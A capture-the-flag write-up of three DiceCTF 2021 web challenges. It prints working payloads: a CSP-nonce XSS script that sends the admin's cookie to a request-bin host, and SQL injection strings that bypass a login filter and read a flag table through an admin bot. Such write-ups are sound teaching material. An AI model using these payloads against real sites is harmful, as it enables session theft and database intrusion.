---
title: "Dice CTF Writeup"
date: 2021-02-08 00:10:00 -0800
categories: [CTF, writeup]
tags: [writeup]
toc: true
---

> DiceCTF is hosted by DiceGang/redpwn.

I played on the team IrisSec.

https://twitter.com/dicegangctf/status/1358626895076544512

## BabyCSP (349 Solves)

> Baby CSP was too hard for us, try Babier CSP.

We are given three things: a link to the website, a link to the "admin bot" which will visit a link on the site that we give it, and the source code for the page.

Open viewing the website, we see pretty quickly that we are able to inject HTML elements through the name parameter.

```
?name=<u>hello</u>
```

So I tried to do XSS and it did not work.

```
?name=<script>alert(1)</script>
```

Looking at the console of the page, we see why it did not work.

```
Content Security Policy: The page’s settings blocked the loading of a resource at inline (“script-src”).
```

Now looking at the source code of the challenge.

```js
const express = require('express');
const crypto = require("crypto");
const config = require("./config.js");
const app = express()
const port = process.env.port || 3000;

const SECRET = config.secret;
const NONCE = crypto.randomBytes(16).toString('base64');

const template = name => `
<html>

${name === '' ? '': `<h1>${name}</h1>`}
<a href='#' id=elem>View Fruit</a>

<script nonce=${NONCE}>
elem.onclick = () => {
  location = "/?name=" + encodeURIComponent(["apple", "orange", "pineapple", "pear"][Math.floor(4 * Math.random())]);
}
</script>

</html>
`;

app.get('/', (req, res) => {
  res.setHeader("Content-Security-Policy", `default-src none; script-src 'nonce-${NONCE}';`);
  res.send(template(req.query.name || ""));
})

app.use('/' + SECRET, express.static(__dirname + "/secret"));

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
```

It looks like a NONCE is used to ensure that any script that runs is supposed to run. If this was implemented properly, a different nonce would be used everytime (meaning it would be generated and passed into the template), however the nonce in this challenge is constant.

We can use the source code to grab the nonce of the script within the template.

```
<script nonce=LRGWAXOY98Es0zz0QOVmag==>
```

Now we can recraft our payload to look like this:


```
?name=<script nonce="LRGWAXOY98Es0zz0QOVmag==" >alert(1)</script>
```

This triggers XSS! Cool.

Now let's write code to grab cookies using a request bin.

```
?name=<script nonce="LRGWAXOY98Es0zz0QOVmag=="> document.location='https://en3x93cvkhcs1.x.pipedream.net//' + document.cookie </script>
```

So the url is 

```
https://babier-csp.dicec.tf/?name=%3Cscript%20nonce%3D%22LRGWAXOY98Es0zz0QOVmag%3D%3D%22%3E%20document.location%3D%27https%3A%2F%2Fen3x93cvkhcs1.x.pipedream.net%2F%2F%27%20%2B%20document.cookie%20%3C%2Fscript%3E
```

Let's send this to the admin bot.

We get this request:

```
//secret=4b36b1b8e47f761263796b1defd80745
```

Looking at the code, we see this interesting line.

```
app.use('/' + SECRET, express.static(__dirname + "/secret"));
```

where SECRET is config.secret, which is also the cookie. Let's go to that URL.

https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/

> dice{web_1s_a_stat3_0f_grac3_857720}

## Missing Flavortext - 224 Solves

> Hmm, it looks like there's no flavortext here. Can you try and find it?

We are given a website with a login form and source code. Let's look at the source code.

```js
const crypto = require('crypto');
const db = require('better-sqlite3')('db.sqlite3')

// remake the `users` table
db.exec(`DROP TABLE IF EXISTS users;`);
db.exec(`CREATE TABLE users(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT
);`);

// add an admin user with a random password
db.exec(`INSERT INTO users (username, password) VALUES (
  'admin',
  '${crypto.randomBytes(16).toString('hex')}'
)`);

const express = require('express');
const bodyParser = require('body-parser');

const app = express();

// parse json and serve static files
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('static'));

// login route
app.post('/login', (req, res) => {
  if (!req.body.username || !req.body.password) {
    return res.redirect('/');
  }

  if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
    return res.redirect('/');
  }

  // see if user is in database
  const query = `SELECT id FROM users WHERE
    username = '${req.body.username}' AND
    password = '${req.body.password}'
  `;

  let id;
  try { id = db.prepare(query).get()?.id } catch {
    return res.redirect('/');
  }

  // correct login
  if (id) return res.sendFile('flag.html', { root: __dirname });

  // incorrect login
  return res.redirect('/');
});

app.listen(3000);
```

Particularly this section:

```js
app.post('/login', (req, res) => {
  if (!req.body.username || !req.body.password) {
    return res.redirect('/');
  }

  if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
    return res.redirect('/');
  }

  // see if user is in database
  const query = `SELECT id FROM users WHERE
    username = '${req.body.username}' AND
    password = '${req.body.password}'
  `;
```

Pretty standard SQL Query, but it filters out a single quote. If we can bypass this filter, we can easily bypass the login page.

I tried all kinds of encoding (hex, unicode, etc) and includes always picked it up.

I then noticed this line of the source code:

```
app.use(bodyParser.urlencoded({ extended: true }));
```

extended is true, what does that mean?

```
http://expressjs.com/en/resources/middleware/body-parser.html


extended

The extended option allows to choose between parsing the URL-encoded data with the querystring library (when false) or the qs library (when true). The “extended” syntax allows for rich objects and arrays to be encoded into the URL-encoded format, allowing for a JSON-like experience with URL-encoded. For more information, please see the qs library.

Defaults to true, but using the default has been deprecated. Please research into the difference between qs and querystring and choose the appropriate setting.
```

So it looks like we can pass arrays or json key pairs username and password. How is that useful? 

Let's look at this sample code:

![ex1](https://i.ibb.co/zPkBW5x/image.png)

When includes is used on an array, it checks to see if one of the elements equals the passed in parameter. When includes is used on a string, it checks to see if any subtring of the string equals the parameter.

This means we can bypass the filter and include a single quote by making the parameter an array.

![ex2](https://i.ibb.co/28vhwnF/image.png)

So this is how the query would print.

In order to do this, we can use burpsuite and modify the request.

Here's a regular request:

```
POST /login HTTP/1.1
Host: missing-flavortext.dicec.tf
Connection: close
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://missing-flavortext.dicec.tf
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://missing-flavortext.dicec.tf/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=admin&password=lol
```

Now we can modify password to become an array:

```
POST /login HTTP/1.1
Host: missing-flavortext.dicec.tf
Connection: close
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://missing-flavortext.dicec.tf
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://missing-flavortext.dicec.tf/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=admin&password[]=' or 1=1;--
```

```
<p>Here's your flag?</p>
<p>dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p>
```

> dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}

## Build a Panel (96 Solves)

I made progress on this one but got stuck, teammate solved it during comp and I figured it out with hints after it ended.

We are given source code for the website, a link to the website, and an admin bot that can visit a link on the website. Here is the interesting part:

```js
app.get('/admin/debug/add_widget', async (req, res) => {
    const cookies = req.cookies;
    const queryParams = req.query;

    if(cookies['token'] && cookies['token'] == secret_token){
        query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;
        db.run(query, (err) => {
            if(err){
                console.log(err);
                res.send('something went wrong');
            }else{
                res.send('success!');
            }
        });
    }else{
        res.redirect('/');
    }
});
```

We also saw this regarding the flag:

```js
db.run(query, [], (err) => {
    if(!err){
        let innerQuery = `INSERT INTO flag SELECT 'dice{fake_flag}'`;
        db.run(innerQuery);
    }else{
        console.error('Could not create flag table');
    }
});
```

So we that if we can execute ``SELECT flag from flag`` we will get the flag.

Using the admin bot, we can use the add_widget function.

So here is the query:

```
INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}
```

The panel ID is one of the cookies given to use (identifies that it is our panel), the widget name and data are displayed for all of widgets in the database in code. We can do something that looks like this, where the injection goes in panel ID:

```
'8ca7797a-8268-400a-b75a-6abaf7564694'', (SELECT flag from flag), '1');--
```

So the query looks like this: 

```
INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('8ca7797a-8268-400a-b75a-6abaf7564694'', (SELECT flag from flag), '1');-- , '${queryParams['widgetname']}', '${queryParams['widgetdata']}
```

Here is the url we give to the admin bot. Keep in mind panel id is my cookie for my panel, if you want to use your panel change it to your ID.

Make sure to include dummy widetname and widgetdata values.

```
https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=8ca7797a-8268-400a-b75a-6abaf7564694', (select flag from flag limit 1), '1');--&widgetname=1&widgetdata=1
```

And going back to the panel, we get the flag:

> dice{ch41n_ChAIn_aNd_m0Re_cHaIn}